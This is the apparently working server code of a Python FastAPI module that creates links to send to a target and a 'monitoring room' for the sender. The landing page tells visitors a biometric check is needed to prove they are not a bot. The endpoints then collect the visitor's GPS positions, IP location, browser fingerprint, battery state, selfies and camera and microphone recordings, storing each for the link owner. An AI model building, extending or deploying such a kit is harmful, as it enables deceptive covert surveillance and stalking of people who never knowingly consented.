"""GPSモード（geo / snap / live）を作り直した独立モジュール。

方針:
  ・テンプレートに JS を全部インライン（/static も ServiceWorker もキャッシュも無関係）
  ・専用テーブル（テナントごとの gps/gps.db）で完結。link_land/live/geofix/collect/spy/livecam は使わない
  ・GPSの要求は「タップと同じタスクで1回だけ」。watch とカメラは別タスクにずらす
  ・見切り判定は retry で巻き戻さない（firstStartAt 基準）

URL:
  相手に送る   GET  /g/{code}
  点を送る     POST /g/{code}/p
  付加情報     POST /g/{code}/x      （回線推定・指紋・自撮り）
  録画を送る   POST /g/{code}/v
  録画一覧     GET  /g/{code}/v.json
  録画再生     GET  /g/{code}/v/{name}
  監視室       GET  /gp/{code}
  一覧・作成   GET  /gp , POST /gp/add
  点のJSON     GET  /api/gp/{code}
"""
from __future__ import annotations

import os
import re
import json
import random
import string
import sqlite3
import datetime as dt

from fastapi import APIRouter, Request, Depends, Form
from fastapi.responses import (HTMLResponse, RedirectResponse, PlainTextResponse,
                               JSONResponse, FileResponse)

from . import tenancy, users, linktrack

router = APIRouter()

MODES = ("geo", "snap", "live")
MODE_LABEL = {
    "geo": "位置情報（GPS）",
    "snap": "一瞬（GPS）",
    "live": "リアルタイム（GPS＋カメラ）",
}
IV_MIN, IV_MAX = 5, 600
KEEP_SEG = 90              # 20秒 × 90 = 30分
SEG_MS = 20000

# ---- 文面（既存のまま） ----
ASK_TEXT = "ボットでないことを確認するため生体認証を行う必要があります"
DENY_TEXT = "アクセスを許可されなかったため確認できませんでした。アクセスを許可してください"
RETRY_TEXT = "もう一度"
GO_TEXT = "確認する"
GATE_EXTRA = ("・位置情報（GPS）を使用します\n"
              "・カメラで映像、マイクで音声を記録します\n"
              "・アプリのインストールや会員登録は不要です")
GATE_WARN = "※位置情報は端末のGPSを使います。屋内などでは精度が落ちることがあります。"

SCHEMA = """
CREATE TABLE IF NOT EXISTS gps_links(
  code TEXT PRIMARY KEY, name TEXT, mode TEXT, interval INTEGER DEFAULT 15,
  dest TEXT, note TEXT, active INTEGER DEFAULT 1, created TEXT,
  last_ts TEXT, last_lat REAL, last_lon REAL, last_acc REAL,
  last_city TEXT, last_ip TEXT, last_src TEXT, points INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS gps_points(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT,
  lat REAL, lon REAL, acc REAL, src TEXT, city TEXT, region TEXT,
  country TEXT, ip TEXT, ua TEXT, vid TEXT, sid TEXT, kind TEXT,
  batt REAL, chg INTEGER);
CREATE INDEX IF NOT EXISTS gps_points_code_id ON gps_points(code, id);
CREATE TABLE IF NOT EXISTS gps_extra(
  code TEXT, vid TEXT, fp TEXT, selfie TEXT, ts TEXT);
"""


# ---------------- ユーティリティ ----------------

def _m():
    from . import main
    return main


def _render(name, request, **ctx):
    return _m().render(name, request, **ctx)


async def _auth(request: Request):
    return await _m().auth(request)


def _now():
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")


def _clamp_iv(v):
    try:
        v = int(v or 15)
    except Exception:
        v = 15
    return max(IV_MIN, min(v, IV_MAX))


def _abs_dest(d):
    d = (d or "").strip()
    if not d:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
        d = "https://" + d
    return d


def _recent(ts, sec):
    if not ts:
        return False
    try:
        t = dt.datetime.fromisoformat(ts)
        if t.tzinfo is None:
            t = t.replace(tzinfo=dt.timezone.utc)
        return (dt.datetime.now(dt.timezone.utc) - t).total_seconds() <= sec
    except Exception:
        return False


def _f(v):
    try:
        return float(v)
    except (TypeError, ValueError):
        return None


def _base(request):
    return _m()._base(request).rstrip("/")


def _owner(code):
    try:
        o = users.owner_of_link(code)
    except Exception:
        o = None
    if not o:
        return None
    try:
        tenancy.set_current(o)
    except Exception:
        pass
    return o


def _dir(owner):
    d = os.path.join(tenancy.ROOT, tenancy.safe_name(owner), "gps")
    os.makedirs(d, exist_ok=True)
    return d


def _db(owner):
    c = sqlite3.connect(os.path.join(_dir(owner), "gps.db"),
                        timeout=15, check_same_thread=False)
    c.row_factory = sqlite3.Row
    try:
        c.execute("PRAGMA journal_mode=WAL")
        c.executescript(SCHEMA)
        c.commit()
    except Exception:
        pass
    return c


def _link(c, code):
    return c.execute("SELECT * FROM gps_links WHERE code=?", (code,)).fetchone()


def _new_code(c, n=8):
    a = string.ascii_lowercase + string.digits
    for _ in range(80):
        code = "".join(random.choice(a) for _ in range(n))
        if not c.execute("SELECT 1 FROM gps_links WHERE code=?", (code,)).fetchone():
            try:
                if not users.owner_of_link(code):
                    return code
            except Exception:
                return code
    return "".join(random.choice(a) for _ in range(n + 4))


def _geo(ip):
    try:
        return linktrack.geo(ip) or {}
    except Exception:
        return {}


def _pt_row(code, q, g, ip, ua, vid, sid, kind):
    lat = _f(q.get("lat") if q.get("lat") is not None else q.get("gps_lat"))
    lon = _f(q.get("lon") if q.get("lon") is not None else q.get("gps_lon"))
    if lat is not None and not (-90.0 <= lat <= 90.0):
        lat = None
    if lon is not None and not (-180.0 <= lon <= 180.0):
        lon = None
    src = "gps"
    if lat is None and g.get("lat") is not None:
        lat, lon, src = _f(g.get("lat")), _f(g.get("lon")), "ip"
    if lat is None:
        return None
    ts = str(q.get("ts") or "")[:32]
    if len(ts) < 19:
        ts = _now()
    chg = q.get("chg")
    return {
        "code": code, "ts": ts, "lat": lat, "lon": lon,
        "acc": _f(q.get("acc") if q.get("acc") is not None else q.get("gps_acc")),
        "src": src, "city": g.get("city"), "region": g.get("region"),
        "country": g.get("country"), "ip": ip, "ua": (ua or "")[:200],
        "vid": (vid or "")[:40], "sid": (sid or "")[:40],
        "kind": str(kind or "pt")[:12], "batt": _f(q.get("batt")),
        "chg": None if chg is None else (1 if chg else 0),
    }


def _insert_points(c, code, rows):
    if not rows:
        return 0
    prev = c.execute("SELECT lat, lon, ts FROM gps_points WHERE code=? "
                     "ORDER BY id DESC LIMIT 1", (code,)).fetchone()
    pkey = (round(prev["lat"], 5), round(prev["lon"], 5)) if prev and prev["lat"] is not None else None
    pts_ts = prev["ts"] if prev else ""
    out, last = [], None
    for r in rows:
        key = (round(r["lat"], 5), round(r["lon"], 5))
        if key == pkey and r["ts"][:19] == (pts_ts or "")[:19]:
            continue
        pkey, pts_ts = key, r["ts"]
        out.append(r)
        last = r
    if not out:
        return 0
    c.executemany(
        "INSERT INTO gps_points(code,ts,lat,lon,acc,src,city,region,country,ip,ua,vid,sid,kind,batt,chg)"
        " VALUES(:code,:ts,:lat,:lon,:acc,:src,:city,:region,:country,:ip,:ua,:vid,:sid,:kind,:batt,:chg)",
        out)
    link = _link(c, code)
    c.execute("UPDATE gps_links SET points=COALESCE(points,0)+?, last_ts=?, last_lat=?, "
              "last_lon=?, last_acc=?, last_city=?, last_ip=?, last_src=? WHERE code=?",
              (len(out), last["ts"], last["lat"], last["lon"], last["acc"],
               last["city"], last["ip"], last["src"], code))
    # 古い点を間引く
    try:
        c.execute("DELETE FROM gps_points WHERE code=? AND id NOT IN "
                  "(SELECT id FROM gps_points WHERE code=? ORDER BY id DESC LIMIT 20000)",
                  (code, code))
    except Exception:
        pass
    c.commit()
    return len(out)


def _set_extra(c, code, vid, fp=None, selfie=None):
    if not vid:
        return
    row = c.execute("SELECT * FROM gps_extra WHERE code=? AND vid=?", (code, vid)).fetchone()
    if row:
        c.execute("UPDATE gps_extra SET fp=COALESCE(?,fp), selfie=COALESCE(?,selfie), ts=? "
                  "WHERE code=? AND vid=?", (fp, selfie, _now(), code, vid))
    else:
        c.execute("INSERT INTO gps_extra(code,vid,fp,selfie,ts) VALUES(?,?,?,?,?)",
                  (code, vid, fp, selfie, _now()))
    c.commit()


def _media_dir(owner, code):
    d = os.path.join(_dir(owner), "media", code)
    os.makedirs(d, exist_ok=True)
    return d


def _share(request, code):
    return _base(request) + "/g/" + code


# ---------------- 相手に踏ませるページ ----------------

@router.get("/g/{code}", response_class=HTMLResponse)
def land(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("リンクが無効です", status_code=404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)
    mode = row["mode"] if row["mode"] in MODES else "geo"
    dest = _abs_dest(row["dest"])
    return _render(
        "gps.html", request,
        code=code, link=dict(row), mode=mode, mode_label=MODE_LABEL[mode],
        dest=dest, dest_min=(0.5 if mode == "snap" else 2.0),
        iv=_clamp_iv(row["interval"]),
        ask_text=ASK_TEXT, deny_text=DENY_TEXT, retry_text=RETRY_TEXT, go_text=GO_TEXT,
        gate_extra=GATE_EXTRA, gate_warn=GATE_WARN,
        is_live=(mode == "live"), seg_ms=SEG_MS,
        ip=linktrack.client_ip(request),
        p=linktrack.parse_ua(request.headers.get("user-agent", "")),
    )


@router.post("/g/{code}/p")
async def add_points(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0, "why": "noowner"}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    c = _db(owner)
    link = _link(c, code)
    if not link or not link["active"]:
        c.close()
        return {"ok": 0, "why": "invalid"}

    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    g = _geo(ip)
    vid = str(body.get("vid") or "")[:40]
    sid = str(body.get("sid") or "")[:40]
    kind = str(body.get("kind") or "pt")[:12]
    if kind not in ("pt", "open", "hb", "stop"):
        kind = "pt"

    raw = body.get("pts")
    raw = raw if isinstance(raw, list) else []
    if body.get("lat") is not None:
        raw = [body] + raw
    raw = raw[:200]

    rows = []
    for q in raw:
        if not isinstance(q, dict):
            continue
        r = _pt_row(code, q, g, ip, ua, vid, sid, kind)
        if r:
            rows.append(r)
    n = _insert_points(c, code, rows)
    iv = _clamp_iv(link["interval"])
    c.close()
    return {"ok": 1, "n": n, "iv": iv, "server": _now()}


@router.post("/g/{code}/x")
async def add_extra(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    c = _db(owner)
    link = _link(c, code)
    if not link or not link["active"]:
        c.close()
        return {"ok": 0}

    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    g = _geo(ip)
    vid = str(body.get("vid") or "")[:40]
    sid = str(body.get("sid") or "")[:40]

    if body.get("fp"):
        _set_extra(c, code, vid, fp=json.dumps(body["fp"], ensure_ascii=False)[:6000])
    if body.get("selfie"):
        _set_extra(c, code, vid, selfie=str(body["selfie"])[:400000])

    n = 0
    if body.get("gps_lat") is not None or body.get("ip_point"):
        r = _pt_row(code, body, g, ip, ua, vid, sid, "snap")
        if r:
            n = _insert_points(c, code, [r])
    c.close()
    return {"ok": 1, "n": n}


# ---------------- 録画 ----------------

@router.post("/g/{code}/v")
async def add_segment(code: str, request: Request, seq: int = 0, ext: str = "webm",
                      sid: str = "", vid: str = ""):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    data = await request.body()
    if not data:
        return {"ok": 0}
    ext = "mp4" if ext == "mp4" else "webm"
    d = _media_dir(owner, code)
    name = "%06d-%s.%s" % (int(seq or 0), (vid or "x")[:8], ext)
    with open(os.path.join(d, name), "wb") as f:
        f.write(data)
    # 古いものを削除
    try:
        files = sorted(os.listdir(d))
        for old in files[:-KEEP_SEG]:
            os.remove(os.path.join(d, old))
    except Exception:
        pass
    return {"ok": 1, "name": name}


@router.get("/g/{code}/v.json")
def list_segments(code: str):
    owner = _owner(code)
    if not owner:
        return {"files": [], "keep_min": 30}
    d = _media_dir(owner, code)
    out = []
    try:
        for name in sorted(os.listdir(d)):
            if not (name.endswith(".webm") or name.endswith(".mp4")):
                continue
            try:
                seq = int(name.split("-")[0])
            except Exception:
                seq = 0
            out.append({"name": name, "seq": seq, "sid": name.split("-")[1].split(".")[0],
                        "url": "/g/" + code + "/v/" + name})
    except Exception:
        pass
    return {"files": out, "keep_min": int(KEEP_SEG * SEG_MS / 60000)}


@router.get("/g/{code}/v/{name}")
def get_segment(code: str, name: str):
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("", status_code=404)
    safe = re.sub(r"[^A-Za-z0-9_.\-]", "", name)
    path = os.path.join(_media_dir(owner, code), safe)
    if not os.path.exists(path):
        return PlainTextResponse("", status_code=404)
    return FileResponse(path)


# ---------------- 監視室 ----------------

@router.get("/gp", response_class=HTMLResponse)
def list_page(request: Request, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    rows = [dict(r) for r in c.execute("SELECT * FROM gps_links ORDER BY created DESC").fetchall()]
    c.close()
    base = _base(request)
    for r in rows:
        r["share"] = base + "/g/" + r["code"]
        r["watch"] = base + "/gp/" + r["code"]
        r["mode_label"] = MODE_LABEL.get(r["mode"] or "", r["mode"] or "")
        r["live"] = bool(r["active"]) and _recent(r["last_ts"], 90)
    groups = {}
    for r in rows:
        groups.setdefault(r["name"] or "名無し", []).append(r)
    return _render("gps_list.html", request, rows=rows, groups=groups, base=base,
                   modes=[(m, MODE_LABEL[m]) for m in MODES])


@router.post("/gp/add")
def create(request: Request, name: str = Form(""), mode: str = Form("geo"),
           interval: int = Form(15), dest: str = Form(""), note: str = Form(""),
           u=Depends(_auth)):
    owner = tenancy.get_current() or u
    mode = mode if mode in MODES else "geo"
    c = _db(owner)
    code = _new_code(c)
    c.execute("INSERT INTO gps_links(code,name,mode,interval,dest,note,active,created,points)"
              " VALUES(?,?,?,?,?,?,1,?,0)",
              (code, (name or "").strip()[:40] or "名無し", mode, _clamp_iv(interval),
               (dest or "").strip(), (note or "").strip()[:200], _now()))
    c.commit()
    c.close()
    try:
        users.register_link(code, u)
    except Exception:
        pass
    return RedirectResponse("/gp/" + code + "?new=1", status_code=303)


@router.get("/gp/{code}", response_class=HTMLResponse)
def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        from fastapi import HTTPException
        raise HTTPException(404)
    rows = [dict(r) for r in c.execute(
        "SELECT id,ts,lat,lon,acc,src,city,ip,vid,sid,kind,batt,chg FROM gps_points "
        "WHERE code=? ORDER BY id DESC LIMIT 3000", (code,)).fetchall()]
    extra = [dict(r) for r in c.execute(
        "SELECT vid,fp,selfie,ts FROM gps_extra WHERE code=? ORDER BY ts DESC", (code,)).fetchall()]
    c.close()
    rows.reverse()
    base = _base(request)
    vids = {}
    for r in rows:
        vids[r["vid"] or "x"] = vids.get(r["vid"] or "x", 0) + 1
    return _render(
        "gps_watch.html", request, code=code, link=dict(row), pts=rows,
        extra=extra, vids=vids, base=base, is_new=(new == "1"),
        mode_label=MODE_LABEL.get(row["mode"] or "", row["mode"] or ""),
        share=base + "/g/" + code,
        watch_url=base + "/gp/" + code,
        live=bool(row["active"]) and _recent(row["last_ts"], 90),
        total=len(rows),
    )


@router.get("/api/gp/{code}")
def api_points(code: str, since: int = 0, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        from fastapi import HTTPException
        raise HTTPException(404)
    pts = [dict(r) for r in c.execute(
        "SELECT id,ts,lat,lon,acc,src,city,vid,sid FROM gps_points "
        "WHERE code=? AND id>? ORDER BY id ASC LIMIT 2000", (code, since)).fetchall()]
    selfie = c.execute("SELECT selfie,ts FROM gps_extra WHERE code=? AND selfie IS NOT NULL "
                       "ORDER BY ts DESC LIMIT 1", (code,)).fetchone()
    c.close()
    iv = _clamp_iv(row["interval"])
    return {
        "mode": row["mode"], "active": bool(row["active"]), "interval": iv,
        "live": bool(row["live"] if "live" in row.keys() else 0)
                or _recent(row["last_ts"], max(90, iv * 4)),
        "last": {"ts": row["last_ts"], "lat": row["last_lat"], "lon": row["last_lon"],
                 "acc": row["last_acc"], "city": row["last_city"], "src": row["last_src"],
                 "ip": row["last_ip"]},
        "count": row["points"] or 0,
        "selfie": (selfie["selfie"] if selfie else ""),
        "selfie_ts": (selfie["ts"] if selfie else ""),
        "points": pts,
        "server": _now(),
    }


@router.post("/gp/{code}/update")
def update(request: Request, code: str, name: str = Form(""), mode: str = Form(""),
           interval: int = Form(0), dest: str = Form(""), note: str = Form(""),
           active: str = Form(""), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    if not _link(c, code):
        c.close()
        from fastapi import HTTPException
        raise HTTPException(404)
    f, v = [], []
    if name.strip():
        f.append("name=?"); v.append(name.strip()[:40])
    if mode in MODES:
        f.append("mode=?"); v.append(mode)
    if interval:
        f.append("interval=?"); v.append(_clamp_iv(interval))
    f.append("dest=?"); v.append((dest or "").strip())
    f.append("note=?"); v.append((note or "").strip()[:200])
    if active in ("0", "1"):
        f.append("active=?"); v.append(int(active))
    v.append(code)
    c.execute("UPDATE gps_links SET " + ",".join(f) + " WHERE code=?", v)
    c.commit()
    c.close()
    return RedirectResponse("/gp/" + code, status_code=303)


@router.post("/gp/{code}/clear")
def clear(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM gps_points WHERE code=?", (code,))
    c.execute("UPDATE gps_links SET points=0, last_ts=NULL, last_lat=NULL, last_lon=NULL,"
              " last_acc=NULL, last_city=NULL, last_ip=NULL, last_src=NULL WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/gp/" + code, status_code=303)


@router.post("/gp/{code}/delete")
def delete(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM gps_points WHERE code=?", (code,))
    c.execute("DELETE FROM gps_extra WHERE code=?", (code,))
    c.execute("DELETE FROM gps_links WHERE code=?", (code,))
    c.commit()
    c.close()
    try:
        users.unlink_owner(code)
    except Exception:
        pass
    return RedirectResponse("/gp", status_code=303)